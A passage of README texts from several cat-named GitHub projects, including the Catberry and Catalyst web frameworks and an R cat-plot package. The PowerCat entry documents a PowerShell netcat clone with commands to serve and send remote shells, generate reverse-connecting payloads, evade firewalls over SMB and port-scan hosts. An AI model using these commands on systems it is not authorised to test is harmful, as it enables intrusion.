{Promise<Object>|Object|null|undefined} Data for the template.\n\t */\n\trender() {\n\t\treturn this.$context.getStoreData();\n\t}\n\n\t/**\n\t * Returns event binding settings for the component.\n\t * This method is optional.\n\t * @returns {Promise<Object>|Object|null|undefined} Binding settings.\n\t */\n\tbind() {\n\t\treturn {\n\t\t\t// CSS selector\n\t\t\t'.clickable': () => window.alert('Ouch!');\n\t\t}\n\t}\n\n\t/**\n\t * Cleans up everything that has NOT been set by .bind() method.\n\t * This method is optional.\n\t * @returns {Promise|undefined} Promise of nothing.\n\t */\n\tunbind() {\n\t\t// nothing to do here we have used bind properly\n\t}\n}\n\nmodule.exports = Some;\nThe component is used as a custom tag:\n<cat-cool id=\"unique-value\" cat-store=\"group/CoolStore\"></cat-cool>\nTypical Store example\n'use strict';\n\nclass CoolStore {\n\t/**\n\t * Creates a new instance of the \"CoolStore\" store.\n\t * @param {ServiceLocator} locator The service locator for resolving dependencies.\n\t */\n\tconstructor(locator) {\n\n\t\t/**\n\t\t * Current universal HTTP request for environment-independent requests.\n\t\t * @type {UHR}\n\t\t * @private\n\t\t */\n\t\tthis._uhr = locator.resolve('uhr');\n\n\t\t/**\n\t\t * Current lifetime of data (in milliseconds) that is returned by this store.\n\t\t * @type {number} Lifetime in milliseconds.\n\t\t */\n\t\tthis.$lifetime = 60000;\n\t}\n\n\t/**\n\t * Loads data from a remote source.\n\t * @returns {Promise<Object>|Object|null|undefined} Loaded data.\n\t */\n\tload() {\n\t\t// Here you can do any HTTP requests using this._uhr.\n\t\t// Please read details here https://github.com/catberry/catberry-uhr.\n\t}\n\n\t/**\n\t * Handles an action named \"some-action\" from any component or store.\n\t * @returns {Promise<Object>|Object|null|undefined} Response to the component/store.\n\t */\n\thandleSomeAction() {\n\t\t// Here you can call this.$context.changed() if you're sure'\n\t\t// that the remote data on the server has been changed.\n\t\t// You can additionally have many handle methods for other actions.\n\t};\n}\n\nmodule.exports = Some;\nBrowser Support\nWhile Catberry is capable of rendering pages for any browser on the server, due to the use of certain HTML5 features, like the History API, only partial support of old browsers is possible for the client-side JavaScript application.\nThe main goal of the Catberry Framework is to use the full power of new technologies and provide a user with the best possible experience.\nIn fact, a user gets an HTML page from the server only once and all the rest of the time the whole page is changing in a browser receiving only pure data from API service(s) used with the application.\nThanks to Catberry's progressive rendering engine, user receives a page from the server component by component as fast as each component renders its template not waiting for the whole page is built.\nCatberry supports 2 last versions of modern browsers and IE 11. It depends on Babel babel-preset-env preset which config you can override putting a .babelrc file in your project.\nContributing\nThere are a lot of ways to contribute into Catberry:\n\nGive it a star\nJoin the Gitter room and leave a feedback or help with answering users' questions\nSubmit a bug or a feature request\nSubmit a PR\nIf you like the logo, you might want to buy a Catberry T-Shirt or a sticker\n\nDenis Rechkunov denis.rechkunov@gmail.com"}, {"title": "Gibbsdavidl/CatterPlots", "language": "R", "content": "CatterPlots\nOne stop shopping for cat themed scatter plots.\nNEW\nRainbow plots.\nMaking a parabola rainbow.\nlibrary(CatterPlots)\nx <- -10:10\ny <- -x^2 + 10\nrainbowCats(x, y, yspread=0.05, xspread=0.05, ptsize=2, catshiftx=0.5, catshifty=-0.2, canvas=c(-0.5,1.5,-1,1.5))\n\n\nAnd...\n\n\nGo ahead, treat yourself! There's over 10 cat models now!\nWell, exactly 11, actually. Eleven types of cats.\nTo install, either:\nlibrary(devtools)\ninstall_github(\"Gibbsdavidl/CatterPlots\")\n\nOr git clone the repo and then install using:\nR CMD INSTALL CatterPlots\n\nIn R:\nlibrary(CatterPlots)\nx <- -10:10\ny <- -x^2 + 10\npurr <- catplot(xs=x, ys=y, cat=3, catcolor='#000000FF')\ncats(purr, -x, -y, cat=4, catcolor='#FF0000')\n\n# for more fun ...\nmeow <- multicat(xs=x, ys=y, cat=c(1,2,3), catcolor=list('#33FCFF','#FF0000'), canvas=c(-0.1,1.1, -0.1, 1.1))\nmorecats(meow, x, 10*sin(x)+40, size=0.05, cat=c(4,5,6), catcolor=list('#0495EE','#EE7504'), type=\"line\")\n\n# random cats\nmeow <- multicat(xs=x, ys=rnorm(21),\n                 cat=c(1,2,3,4,5,6,7,8,9,10),\n                 catcolor=list('#33FCFF'),\n                 canvas=c(-0.1,1.1, -0.1, 1.1),\n                 xlab=\"some cats\", ylab=\"other cats\", main=\"Random Cats\")"}, {"title": "Maescool/Catacomb-Snatch", "language": "Java", "content": "Travis: \nJenkins: \nLinks\n\nOriginal source from Mojang\nWebsite\nForum\nMinecraft Forum thread\nPlayer & developer wiki\nJenkins Build-Bot (Last releases can be found here)\nDownload last release\nDownload last development build\nChat with the developers on the Webchat or irc.freenode.net #catacomb-snatch\nlibGDX rewrite"}, {"title": "secabstraction/PowerCat", "language": "PowerShell", "content": "PowerCat\nA PowerShell TCP/IP swiss army knife that works with Netcat & NcatInspired by: https://github.com/besimorhino/powercat\nInstallation\nPowerCat is packaged as a PowerShell module.  You must import the module to use its functions.\n    # Import the functions via the psd1 file:\n    Import-Module PowerCat.psd1\nFunctions & Parameters:\nStart-PowerCat      # Starts a listener/server.\n    \n    -Mode           # Defaults to Tcp, can also specify Udp or Smb.\n    -Port           # The port to listen on.\n    -PipeName       # Name of pipe to listen on.\n\t\n    -SslCn\t    # Common name for Ssl encrypting Tcp.\n    -Relay          # Format: \"<Mode>:<Port/PipeName>\"\n    -Execute        # Execute a console process or powershell.\n    -SendFile       # Filepath of file to send.\n    -ReceiveFile    # Filepath of file to be written.\n    -Disconnect     # Disconnect after connecting.\n    -KeepAlive      # Restart after disconnecting.\n    -Timeout        # Timeout option. Default: 60 seconds\n\t\nConnect-PowerCat    # Connects a client to a listener/server.\n\t\n    -Mode           # Defaults to Tcp, can also specify Udp or Smb\n    -RemoteIp       # IPv4 address of host to connect to.\n    -Port           # The port to connect to.\n    -PipeName       # Name of pipe to connect to.\n\t\n    -SslCn\t    # Common name for Ssl encrypting Tcp.\n    -Relay          # Format: \"<Mode>:<IP>:<Port/PipeName>\"\n    -Execute        # Execute a console process or powershell.\n    -SendFile       # Filepath of file to send.\n    -ReceiveFile    # Filepath of file to be written.\n    -Disconnect     # Disconnect after connecting.\n    -Timeout        # Timeout option. Default: 60 seconds\nBasic Connections\nBy default, PowerCat uses TCP and reads from / writes to the console.\n    # Basic Listener:\n    Start-PowerCat -Port 443\n        \n    # Basic Client:\n    Connect-PowerCat -RemoteIp 10.1.1.1 -Port 443\nFile Transfer\nPowerCat can be used to transfer files using the -SendFile and -ReceiveFile parameters.\n    # Send File:\n    Connect-PowerCat -RemoteIp 10.1.1.1 -Port 443 -SendFile C:\\pathto\\inputfile\n        \n    # Receive File:\n    Start-PowerCat -Port 443 -ReceiveFile C:\\pathto\\outputfile\nShells\nPowerCat can be used to send and serve (Power)Shells using the -Execute parameter.\n    # Serve a shell:\n    Start-PowerCat -Port 443 -Execute\n        \n    # Send a Shell:\n    Connect-PowerCat -RemoteIp 10.1.1.1 -Port 443 -Execute\nUDP and SMB\nPowerCat supports more than sending data over TCP.\n    # Send Data Over UDP:\n    Start-PowerCat -Mode Udp -Port 8000\n        \n    # Send Data Over SMB (easily sneak past firewalls):\n    Start-PowerCat -Mode Smb -PipeName PowerCat\nSSL\nPowerCat generates X509 certificates on-the-fly to provide SSL encryption of TCP connections.\n    # Admin privileges are required to generate the self-signed certificate.\n\t\n    # Serve an SSL-Encrypted (Power)Shell:\n    Start-PowerCat -Mode Tcp -Port 80 -SslCn <Certificate Common Name> -Execute\n        \n    # Connect to an SSL encrypted Ncat listener:\n    # Setup *nix with openssl & Ncat:\n    # openssl req -X509 -newkey rsa:2048 -subj /CN=PowerCat -days 90 -keyout key.pem -out cert.pem\n    # ncat -l -p 80 --ssl --ssl-cert cert.pem --ssl-key key.pem\n\t\n    Connect-PowerCat -Mode Tcp -RemoteIp 10.1.1.1 -Port 80 -SslCn PowerCat \nRelays\nRelays in PowerCat are similar to netcat relays, but you don't have to create a file or start a second process. You can also relay data between connections of different protocols.\n    # UDP Listener to TCP Client Relay:\n    Start-PowerCat -Mode Udp -Port 8000 -Relay tcp:10.1.1.16:443\n        \n    # TCP Listener to UDP Client Relay:\n    Start-PowerCat -Port 8000 -Relay udp:10.1.1.16:53\n        \n    # TCP Client to Client Relay\n    Connect-PowerCat -RemoteIp 10.1.1.1 -Port 9000 -Relay tcp:10.1.1.16:443\n        \n    # TCP Listener to SMB Listener Relay\n    New-PowerCat -Listener -Port 8000 -Relay smb:PowerCat\nGenerate Payloads\nPayloads can be generated using the New-PowerCatPayload function.\n    # Generate a reverse tcp payload that connects back to 10.1.1.15 port 443:\n    New-PowerCatPayload -RemoteIp 10.1.1.15 -Port 443 -Execute \n        \n    # Generate a tcp payload that listens on port 8000:\n    New-PowerCatPayload -Listener -Port 8000 -Execute\nMisc Usage\nPowerCat can also perform port-scans, start persistent listeners, or act as a simple web server.\n    # Basic TCP port scan:\n    1..1024 | ForEach-Object { Connect-PowerCat -RemoteIp 10.1.1.10 -Port $_ -Timeout 1 -Verbose -Disconnect }\n    \n    # Basic UDP port scan:\n    1..1024 | ForEach-Object { Connect-PowerCat -Mode Udp -RemoteIp 10.1.1.10 -Port $_ -Timeout 1 -Verbose }\n        \n    # Persistent listener:\n    Start-PowerCat -Port 443 -Execute -KeepAlive\n\t\n    # Simple Web Server:\n    Start-PowerCat -Port 80 -SendFile index.html\nExiting\nIn most cases, the ESC key can be used to gracefully exit PowerCat."}, {"title": "perl-catalyst/catalyst-runtime", "language": "Perl", "content": "NAME\nCatalyst - The Elegant MVC Web Application Framework\nSYNOPSIS\nSee the Catalyst::Manual distribution for comprehensive\ndocumentation and tutorials.\n# Install Catalyst::Devel for helpers and other development tools\n# use the helper to create a new application\ncatalyst.pl MyApp\n\n# add models, views, controllers\nscript/myapp_create.pl model MyDatabase DBIC::Schema create=static dbi:SQLite:/path/to/db\nscript/myapp_create.pl view MyTemplate TT\nscript/myapp_create.pl controller Search\n\n# built in testserver -- use -r to restart automatically on changes\n# --help to see all available options\nscript/myapp_server.pl\n\n# command line testing interface\nscript/myapp_test.pl /yada\n\n### in lib/MyApp.pm\nuse Catalyst qw/-Debug/; # include plugins here as well\n\n### In lib/MyApp/Controller/Root.pm (autocreated)\nsub foo : Chained('/') Args() { # called for /foo, /foo/1, /foo/1/2, etc.\n    my ( $self, $c, @args ) = @_; # args are qw/1 2/ for /foo/1/2\n    $c->stash->{template} = 'foo.tt'; # set the template\n    # lookup something from db -- stash vars are passed to TT\n    $c->stash->{data} =\n      $c->model('Database::Foo')->search( { country => $args[0] } );\n    if ( $c->req->params->{bar} ) { # access GET or POST parameters\n        $c->forward( 'bar' ); # process another action\n        # do something else after forward returns\n    }\n}\n\n# The foo.tt TT template can use the stash data from the database\n[% WHILE (item = data.next) %]\n    [% item.foo %]\n[% END %]\n\n# called for /bar/of/soap, /bar/of/soap/10, etc.\nsub bar : Chained('/') PathPart('/bar/of/soap') Args() { ... }\n\n# called after all actions are finished\nsub end : Action {\n    my ( $self, $c ) = @_;\n    if ( scalar @{ $c->error } ) { ... } # handle errors\n    return if $c->res->body; # already have a response\n    $c->forward( 'MyApp::View::TT' ); # render template\n}\n\nSee Catalyst::Manual::Intro for additional information.\nDESCRIPTION\nCatalyst is a modern framework for making web applications without the\npain usually associated with this process. This document is a reference\nto the main Catalyst application. If you are a new user, we suggest you\nstart with Catalyst::Manual::Tutorial or Catalyst::Manual::Intro.\nSee Catalyst::Manual for more documentation.\nCatalyst plugins can be loaded by naming them as arguments to the \"use\nCatalyst\" statement. Omit the Catalyst::Plugin:: prefix from the\nplugin name, i.e., Catalyst::Plugin::My::Module becomes\nMy::Module.\nuse Catalyst qw/My::Module/;\n\nIf your plugin starts with a name other than Catalyst::Plugin::, you can\nfully qualify the name by using a unary plus:\nuse Catalyst qw/\n    My::Module\n    +Fully::Qualified::Plugin::Name\n/;\n\nSpecial flags like -Debug can also be specified as\narguments when Catalyst is loaded:\nuse Catalyst qw/-Debug My::Module/;\n\nThe position of plugins and flags in the chain is important, because\nthey are loaded in the order in which they appear.\nThe following flags are supported:\n-Debug\nEnables debug output. You can also force this setting from the system\nenvironment with CATALYST_DEBUG or _DEBUG. The environment\nsettings override the application, with _DEBUG having the highest\npriority.\nThis sets the log level to 'debug' and enables full debug output on the\nerror screen. If you only want the latter, see $c->debug.\n-Home\nForces Catalyst to use a specific home directory, e.g.:\nuse Catalyst qw[-Home=/usr/mst];\n\nThis can also be done in the shell environment by setting either the\nCATALYST_HOME environment variable or MYAPP_HOME; where MYAPP\nis replaced with the uppercased name of your application, any \"::\" in\nthe name will be replaced with underscores, e.g. MyApp::Web should use\nMYAPP_WEB_HOME. If both variables are set, the MYAPP_HOME one will be used.\nIf none of these are set, Catalyst will attempt to automatically detect the\nhome directory. If you are working in a development environment, Catalyst\nwill try and find the directory containing either Makefile.PL, Build.PL,\ndist.ini, or cpanfile. If the application has been installed into the system\n(i.e. you have done make install), then Catalyst will use the path to your\napplication module, without the .pm extension (e.g., /foo/MyApp if your\napplication was installed at /foo/MyApp.pm)\n-Log\nuse Catalyst '-Log=warn,fatal,error';\n\nSpecifies a comma-delimited list of log levels.\n-Stats\nEnables statistics collection and reporting.\nuse Catalyst qw/-Stats=1/;\n\nYou can also force this setting from the system environment with CATALYST_STATS\nor _STATS. The environment settings override the application, with\n_STATS having the highest priority.\nStats are also enabled if debugging  is enabled.\nMETHODS\nINFORMATION ABOUT THE CURRENT REQUEST\n$c->action\nReturns a Catalyst::Action object for the current action, which\nstringifies to the action name. See Catalyst::Action.\n$c->namespace\nReturns the namespace of the current action, i.e., the URI prefix\ncorresponding to the controller of the current action. For example:\n# in Controller::Foo::Bar\n$c->namespace; # returns 'foo/bar';\n\n$c->request\n$c->req\nReturns the current Catalyst::Request object, giving access to\ninformation about the current client request (including parameters,\ncookies, HTTP headers, etc.). See Catalyst::Request.\nREQUEST FLOW HANDLING\n$c->forward( $action [, \\@arguments ] )\n$c->forward( $class, $method, [, \\@arguments ] )\nThis is one way of calling another action (method) in the same or\na different controller. You can also use $self->my_method($c, @args)\nin the same controller or $c->controller('MyController')->my_method($c, @args)\nin a different controller.\nThe main difference is that 'forward' uses some of the Catalyst request\ncycle overhead, including debugging, which may be useful to you. On the\nother hand, there are some complications to using 'forward', restrictions\non values returned from 'forward', and it may not handle errors as you prefer.\nWhether you use 'forward' or not is up to you; it is not considered superior to\nthe other ways to call a method.\n'forward' calls  another action, by its private name. If you give a\nclass name but no method, process() is called. You may also optionally\npass arguments in an arrayref. The action will receive the arguments in\n@_ and $c->req->args. Upon returning from the function,\n$c->req->args will be restored to the previous values.\nAny data returned from the action forwarded to, will be returned by the\ncall to forward.\nmy $foodata = $c->forward('/foo');\n$c->forward('index');\n$c->forward(qw/Model::DBIC::Foo do_stuff/);\n$c->forward('View::TT');\n\nNote that forward implies\nan eval { } around the call (actually\nexecute does), thus rendering all\nexceptions thrown by the called action non-fatal and pushing them onto\n$c->error instead. If you want die to propagate you need to do something\nlike:\n$c->forward('foo');\ndie join \"\\n\", @{ $c->error } if @{ $c->error };\n\nOr make sure to always return true values from your actions and write\nyour code like this:\n$c->forward('foo') || return;\n\nAnother note is that $c->forward always returns a scalar because it\nactually returns $c->state which operates in a scalar context.\nThus, something like:\nreturn @array;\n\nin an action that is forwarded to is going to return a scalar,\ni.e. how many items are in that array, which is probably not what you want.\nIf you need to return an array then return a reference to it,\nor stash it like so:\n$c->stash->{array} = \\@array;\n\nand access it from the stash.\nKeep in mind that the end method used is that of the caller action. So a $c->detach inside a forwarded action would run the end method from the original action requested.\n$c->detach( $action [, \\@arguments ] )\n$c->detach( $class, $method, [, \\@arguments ] )\n$c->detach()\nThe same as forward, but\ndoesn't return to the previous action when processing is finished.\nWhen called with no arguments it escapes the processing chain entirely.\n$c->visit( $action [, \\@arguments ] )\n$c->visit( $action [, \\@captures, \\@arguments ] )\n$c->visit( $class, $method, [, \\@arguments ] )\n$c->visit( $class, $method, [, \\@captures, \\@arguments ] )\nAlmost the same as forward,\nbut does a full dispatch, instead of just calling the new $action /\n$class->$method. This means that begin, auto and the method\nyou go to are called, just like a new request.\nIn addition both $c->action and $c->namespace are localized.\nThis means, for example, that $c->action methods such as\nname, class and\nreverse return information for the visited action\nwhen they are invoked within the visited action.  This is different from the\nbehavior of forward, which\ncontinues to use the $c->action object from the caller action even when\ninvoked from the called action.\n$c->stash is kept unchanged.\nIn effect, visit\nallows you to \"wrap\" another action, just as it would have been called by\ndispatching from a URL, while the analogous\ngo allows you to\ntransfer control to another action as if it had been reached directly from a URL.\n$c->go( $action [, \\@arguments ] )\n$c->go( $action [, \\@captures, \\@arguments ] )\n$c->go( $class, $method, [, \\@arguments ] )\n$c->go( $class, $method, [, \\@captures, \\@arguments ] )\nThe relationship between go and\nvisit is the same as\nthe relationship between\nforward and\ndetach. Like $c->visit,\n$c->go will perform a full dispatch on the specified action or method,\nwith localized $c->action and $c->namespace. Like detach,\ngo escapes the processing of the current request chain on completion, and\ndoes not return to its caller.\n@arguments are arguments to the final destination of $action. @captures are\narguments to the intermediate steps, if any, on the way to the final sub of\n$action.\n$c->response\n$c->res\nReturns the current Catalyst::Response object, see there for details.\n$c->stash\nReturns a hashref to the stash, which may be used to store data and pass\nit between components during a request. You can also set hash keys by\npassing arguments. The stash is automatically sent to the view. The\nstash is cleared at the end of a request; it cannot be used for\npersistent storage (for this you must use a session; see\nCatalyst::Plugin::Session for a complete system integrated with\nCatalyst).\n$c->stash->{foo} = $bar;\n$c->stash( { moose => 'majestic', qux => 0 } );\n$c->stash( bar => 1, gorch => 2 ); # equivalent to passing a hashref\n\n# stash is automatically passed to the view for use in a template\n$c->forward( 'MyApp::View::TT' );\n\nThe stash hash is currently stored in the PSGI $env and is managed by\nCatalyst::Middleware::Stash.  Since it's part of the $env items in\nthe stash can be accessed in sub applications mounted under your main\nCatalyst application.  For example if you delegate the response of an\naction to another Catalyst application, that sub application will have\naccess to all the stash keys of the main one, and if can of course add\nmore keys of its own.  However those new keys will not 'bubble' back up\nto the main application.\nFor more information the best thing to do is to review the test case:\nt/middleware-stash.t in the distribution /t directory.\n$c->error\n$c->error($error, ...)\n$c->error($arrayref)\nReturns an arrayref containing error messages.  If Catalyst encounters an\nerror while processing a request, it stores the error in $c->error.  This\nmethod should only be used to store fatal error messages.\nmy @error = @{ $c->error };\n\nAdd a new error.\n$c->error('Something bad happened');\n\nCalling this will always return an arrayref (if there are no errors it\nwill be an empty arrayref.\n$c->state\nContains the return value of the last executed action.\nNote that << $c->state >> operates in a scalar context which means that all\nvalues it returns are scalar.\nPlease note that if an action throws an exception, the value of state\nshould no longer be considered the return if the last action.  It is generally\ngoing to be 0, which indicates an error state.  Examine $c->error for error\ndetails.\n$c->clear_errors\nClear errors.  You probably don't want to clear the errors unless you are\nimplementing a custom error screen.\nThis is equivalent to running\n$c->error(0);\n\n$c->has_errors\nReturns true if you have errors\n$c->last_error\nReturns the most recent error in the stack (the one most recently added...)\nor nothing if there are no errors.  This does not modify the contents of the\nerror stack.\nshift_errors\nshifts the most recently added error off the error stack and returns it.  Returns\nnothing if there are no more errors.\npop_errors\npops the most recently added error off the error stack and returns it.  Returns\nnothing if there are no more errors.\nCOMPONENT ACCESSORS\n$c->controller($name)\nGets a Catalyst::Controller instance by name.\n$c->controller('Foo')->do_stuff;\n\nIf the name is omitted, will return the controller for the dispatched\naction.\nIf you want to search for controllers, pass in a regexp as the argument.\n# find all controllers that start with Foo\nmy @foo_controllers = $c->controller(qr{^Foo});\n\n$c->model($name)\nGets a Catalyst::Model instance by name.\n$c->model('Foo')->do_stuff;\n\nAny extra arguments are directly passed to ACCEPT_CONTEXT, if the model\ndefines ACCEPT_CONTEXT.  If it does not, the args are discarded.\nIf the name is omitted, it will look for\n\na model object in $c->stash->{current_model_instance}, then\na model name in $c->stash->{current_model}, then\na config setting 'default_model', or\ncheck if there is only one model, and return it if that's the case.\n\nIf you want to search for models, pass in a regexp as the argument.\n# find all models that start with Foo\nmy @foo_models = $c->model(qr{^Foo});\n\n$c->view($name)\nGets a Catalyst::View instance by name.\n$c->view('Foo')->do_stuff;\n\nAny extra arguments are directly passed to ACCEPT_CONTEXT.\nIf the name is omitted, it will look for\n\na view object in $c->stash->{current_view_instance}, then\na view name in $c->stash->{current_view}, then\na config setting 'default_view', or\ncheck if there is only one view, and return it if that's the case.\n\nIf you want to search for views, pass in a regexp as the argument.\n# find all views that start with Foo\nmy @foo_views = $c->view(qr{^Foo});\n\n$c->controllers\nReturns the available names which can be passed to $c->controller\n$c->models\nReturns the available names which can be passed to $c->model\n$c->views\nReturns the available names which can be passed to $c->view\n$c->comp($name)\n$c->component($name)\nGets a component object by name. This method is not recommended,\nunless you want to get a specific component by full\nclass. $c->controller, $c->model, and $c->view\nshould be used instead.\nIf $name is a regexp, a list of components matched against the full\ncomponent name will be returned.\nIf Catalyst can't find a component by name, it will fallback to regex\nmatching by default. To disable this behaviour set\ndisable_component_resolution_regex_fallback to a true value.\n__PACKAGE__->config( disable_component_resolution_regex_fallback => 1 );\n\nCLASS DATA AND HELPER CLASSES\n$c->config\nReturns or takes a hashref containing the application's configuration.\n__PACKAGE__->config( { db => 'dsn:SQLite:foo.db' } );\n\nYou can also use a YAML, XML or Config::General config file\nlike myapp.conf in your applications home directory. See\nCatalyst::Plugin::ConfigLoader.\nCascading configuration\nThe config method is present on all Catalyst components, and configuration\nwill be merged when an application is started. Configuration loaded with\nCatalyst::Plugin::ConfigLoader takes precedence over other configuration,\nfollowed by configuration in your top level MyApp class. These two\nconfigurations are merged, and then configuration data whose hash key matches a\ncomponent name is merged with configuration for that component.\nThe configuration for a component is then passed to the new method when a\ncomponent is constructed.\nFor example:\nMyApp->config({ 'Model::Foo' => { bar => 'baz', overrides => 'me' } });\nMyApp::Model::Foo->config({ quux => 'frob', overrides => 'this' });\n\nwill mean that MyApp::Model::Foo receives the following data when\nconstructed:\nMyApp::Model::Foo->new({\n    bar => 'baz',\n    quux => 'frob',\n    overrides => 'me',\n});\n\nIt's common practice to use a Moose attribute\non the receiving component to access the config value.\npackage MyApp::Model::Foo;\n\nuse Moose;\n\n# this attr will receive 'baz' at construction time\nhas 'bar' => (\n    is  => 'rw',\n    isa => 'Str',\n);\n\nYou can then get the value 'baz' by calling $c->model('Foo')->bar\n(or $self->bar inside code in the model).\nNOTE: you MUST NOT call $self->config or __PACKAGE__->config\nas a way of reading config within your code, as this will not give you the\ncorrectly merged config back. You MUST take the config values supplied to\nthe constructor and use those instead.\n$c->log\nReturns the logging object instance. Unless it is already set, Catalyst\nsets this up with a Catalyst::Log object. To use your own log class,\nset the logger with the __PACKAGE__->log method prior to calling\n__PACKAGE__->setup.\n__PACKAGE__->log( MyLogger->new );\n__PACKAGE__->setup;\n\nAnd later:\n$c->log->info( 'Now logging with my own logger!' );\n\nYour log class should implement the methods described in\nCatalyst::Log.\nhas_encoding\nReturned True if there's a valid encoding\nclear_encoding\nClears the encoding for the current context\nencoding\nSets or gets the application encoding.  Setting encoding takes either an\nEncoding object or a string that we try to resolve via Encode::find_encoding.\nYou would expect to get the encoding object back if you attempt to set it.  If\nthere is a failure you will get undef returned and an error message in the log.\n$c->debug\nReturns 1 if debug mode is enabled, 0 otherwise.\nYou can enable debug mode in several ways:\n\nBy calling myapp_server.pl with the -d flag\nWith the environment variables MYAPP_DEBUG, or CATALYST_DEBUG\nThe -Debug option in your MyApp.pm\nBy declaring sub debug { 1 } in your MyApp.pm.\n\nThe first three also set the log level to 'debug'.\nCalling $c->debug(1) has no effect.\n$c->dispatcher\nReturns the dispatcher instance. See Catalyst::Dispatcher.\n$c->engine\nReturns the engine instance. See Catalyst::Engine.\nUTILITY METHODS\n$c->path_to(@path)\nMerges @path with $c->config->{home} and returns a\nPath::Class::Dir object. Note you can usually use this object as\na filename, but sometimes you will have to explicitly stringify it\nyourself by calling the ->stringify method.\nFor example:\n$c->path_to( 'db', 'sqlite.db' );\n\nMyApp->setup\nInitializes the dispatcher and engine, loads any plugins, and loads the\nmodel, view, and controller components. You may also specify an array\nof plugins to load here, if you choose to not load them in the use Catalyst line.\nMyApp->setup;\nMyApp->setup( qw/-Debug/ );\n\nNote: You should not wrap this method with method modifiers\nor bad things will happen - wrap the setup_finalize method instead.\nNote: You can create a custom setup stage that will execute when the\napplication is starting.  Use this to customize setup.\nMyApp->setup(-Custom=value);\n\nsub setup_custom {\n  my ($class, $value) = @_;\n}\n\nCan be handy if you want to hook into the setup phase.\n$app->setup_finalize\nA hook to attach modifiers to. This method does not do anything except set the\nsetup_finished accessor.\nApplying method modifiers to the setup method doesn't work, because of quirky things done for plugin setup.\nExample:\nafter setup_finalize => sub {\n    my $app = shift;\n\n    ## do stuff here..\n};\n\n$c->uri_for( $path?, @args?, \\%query_values?, \\$fragment? )\n$c->uri_for( $action, \\@captures?, @args?, \\%query_values?, \\$fragment? )\n$c->uri_for( $action, [@captures, @args], \\%query_values?, \\$fragment? )\nConstructs an absolute URI object based on the application root, the\nprovided path, and the additional arguments and query parameters provided.\nWhen used as a string, provides a textual URI.  If you need more flexibility\nthan this (i.e. the option to provide relative URIs etc.) see\nCatalyst::Plugin::SmartURI.\nIf no arguments are provided, the URI for the current action is returned.\nTo return the current action and also provide @args, use\n$c->uri_for( $c->action, @args ).\nIf the first argument is a string, it is taken as a public URI path relative\nto $c->namespace (if it doesn't begin with a forward slash) or\nrelative to the application root (if it does). It is then merged with\n$c->request->base; any @args are appended as additional path\ncomponents; and any %query_values are appended as ?foo=bar parameters.\nNOTE If you are using this 'stringy' first argument, we skip encoding and\nallow you to declare something like:\n$c->uri_for('/foo/bar#baz')\n\nWhere 'baz' is a URI fragment.  We consider this first argument string to be\n'expert' mode where you are expected to create a valid URL and we for the most\npart just pass it through without a lot of internal effort to escape and encode.\nIf the first argument is a Catalyst::Action it represents an action which\nwill have its path resolved using $c->dispatcher->uri_for_action. The\noptional \\@captures argument (an arrayref) allows passing the captured\nvariables that are needed to fill in the paths of Chained and Regex actions;\nonce the path is resolved, uri_for continues as though a path was\nprovided, appending any arguments or parameters and creating an absolute\nURI.\nThe captures for the current request can be found in\n$c->request->captures, and actions can be resolved using\nCatalyst::Controller->action_for($name). If you have a private action\npath, use $c->uri_for_action instead.\n# Equivalent to $c->req->uri\n$c->uri_for($c->action, $c->req->captures,\n    @{ $c->req->args }, $c->req->params);\n\n# For the Foo action in the Bar controller\n$c->uri_for($c->controller('Bar')->action_for('Foo'));\n\n# Path to a static resource\n$c->uri_for('/static/images/logo.png');\n\nIn general the scheme of the generated URI object will follow the incoming request\nhowever if your targeted action or action chain has the Scheme attribute it will\nuse that instead.\nAlso, if the targeted Action or Action chain declares Args/CaptureArgs that have\ntype constraints, we will require that your proposed URL verify on those declared\nconstraints.\n$c->uri_for_action( $path, \\@captures_and_args?, @args?, \\%query_values? )\n$c->uri_for_action( $action, \\@captures_and_args?, @args?, \\%query_values? )\n\n\n$path\nA private path to the Catalyst action you want to create a URI for.\nThis is a shortcut for calling $c->dispatcher->get_action_by_path($path) and passing the resulting $action and the remaining arguments to $c->uri_for.\nYou can also pass in a Catalyst::Action object, in which case it is passed to\n$c->uri_for.\nNote that although the path looks like a URI that dispatches to the wanted action, it is not a URI, but an internal path to that action.\nFor example, if the action looks like:\n  package MyApp::Controller::Users;\n\n  sub lst : Path('the-list') {}\n\nYou can use:\n  $c->uri_for_action('/users/lst')\n\nand it will create the URI /users/the-list.\n\n\n\\@captures_and_args?\nOptional array reference of Captures (i.e. CaptureArgs or $c->req->captures)\nand arguments to the request. Usually used with Catalyst::DispatchType::Chained\nto interpolate all the parameters in the URI.\n\n\n@args?\nOptional list of extra arguments - can be supplied in the\n\\@captures_and_args? array ref, or here - whichever is easier for your\ncode.\nYour action can have zero, a fixed or a variable number of args (e.g.\nArgs(1) for a fixed number or Args() for a variable number)..\n\n\n\\%query_values?\nOptional array reference of query parameters to append. E.g.\n  { foo => 'bar' }\n\nwill generate\n  /rest/of/your/uri?foo=bar\n\n\n\n$c->welcome_message\nReturns the Catalyst welcome HTML page.\nrun_options\nContains a hash of options passed from the application script, including\nthe original ARGV the script received, the processed values from that\nARGV and any extra arguments to the script which were not processed.\nThis can be used to add custom options to your application's scripts\nand setup your application differently depending on the values of these\noptions.\nINTERNAL METHODS\nThese methods are not meant to be used by end users.\n$c->components\nReturns a hash of components.\n$c->context_class\nReturns or sets the context class.\n$c->counter\nReturns a hashref containing coderefs and execution counts (needed for\ndeep recursion detection).\n$c->depth\nReturns the number of actions on the current internal execution stack.\n$c->dispatch\nDispatches a request to actions.\n$c->dispatcher_class\nReturns or sets the dispatcher class.\n$c->dump_these\nReturns a list of 2-element array references (name, structure) pairs\nthat will be dumped on the error page in debug mode.\n$c->engine_class\nReturns or sets the engine class.\n$c->execute( $class, $coderef )\nExecute a coderef in given class and catch exceptions. Errors are available\nvia $c->error.\n$c->finalize\nFinalizes the request.\n$c->finalize_body\nFinalizes body.\n$c->finalize_cookies\nFinalizes cookies.\n$c->finalize_error\nFinalizes error.  If there is only one error in \"error\" and it is an object that\ndoes as_psgi or code we rethrow the error and presume it caught by middleware\nup the ladder.  Otherwise we return the debugging error page (in debug mode) or we\nreturn the default error page (production mode).\n$c->finalize_headers\nFinalizes headers.\n$c->finalize_encoding\nMake sure your body is encoded properly IF you set an encoding.  By\ndefault the encoding is UTF-8 but you can disable it by explicitly setting the\nencoding configuration value to undef.\nWe can only encode when the body is a scalar.  Methods for encoding via the\nstreaming interfaces (such as write and write_fh on Catalyst::Response\nare available).\nSee \"ENCODING\".\n$c->finalize_output\nAn alias for finalize_body.\n$c->finalize_read\nFinalizes the input after reading is complete.\n$c->finalize_uploads\nFinalizes uploads. Cleans up any temporary files.\n$c->get_action( $action, $namespace 